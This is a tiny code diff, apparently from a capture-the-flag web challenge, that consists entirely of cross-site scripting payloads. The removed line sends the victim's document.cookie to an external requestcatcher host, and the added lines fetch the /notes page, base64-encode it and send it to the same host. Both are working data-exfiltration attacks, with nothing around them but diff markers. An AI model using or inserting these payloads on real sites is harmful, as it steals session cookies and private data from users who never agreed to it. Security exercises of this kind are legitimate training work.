@@ -1,1 +1,3 @@
-<script>fetch('https://flag.requestcatcher.com/?kebab='+document.cookie)</script>
+fetch("/notes").then(r=>r.text()).then(d=>{
+  fetch("https://flag.requestcatcher.com/?dump="+btoa(d))
+});
